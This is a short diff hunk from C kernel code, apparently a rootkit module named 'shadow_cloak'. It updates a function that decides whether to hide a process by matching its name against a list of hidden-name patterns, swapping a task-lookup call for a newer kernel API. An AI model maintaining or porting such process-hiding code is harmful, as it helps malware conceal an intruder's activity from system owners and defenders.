@@ -80,7 +80,7 @@ bool shadow_cloak_is_hidden(pid_t pid)
     
     /* Check by name pattern */
     rcu_read_lock();
-    task = find_task_by_vpid(pid);
+    task = pid_task(find_vpid(pid), PIDTYPE_PID);
     if (task) {
         list_for_each_entry(hn, &hidden_names, list) {
             if (strstr(task->comm, hn->pattern)) {
